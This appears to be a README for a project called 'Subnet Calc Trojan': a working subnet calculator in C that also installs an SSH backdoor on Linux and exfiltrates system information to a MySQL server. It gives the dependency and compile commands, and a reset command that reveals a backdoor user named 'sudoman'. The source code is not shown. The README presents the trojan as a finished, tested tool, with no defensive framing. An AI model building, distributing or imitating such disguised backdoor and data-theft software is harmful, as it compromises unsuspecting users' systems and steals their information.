# Subnet Calc Trojan
 A working Subnet Calculator written in C which installs an ssh backdoor on a linux system and exfiltrates system info to a mySQL server.

mySQL API Dependency:
apt-get install libmysqlclient-dev

To Compile:
gcc -o SubnetCalc 'Subnet Calculator.c' -lm $(mysql_config --cflags) $(mysql_config --libs)
	*The order is important

To Reset:
sudo deluser sudoman; sudo apt-get remove ssh

Tested on Ubuntu 18.04.4 LTS
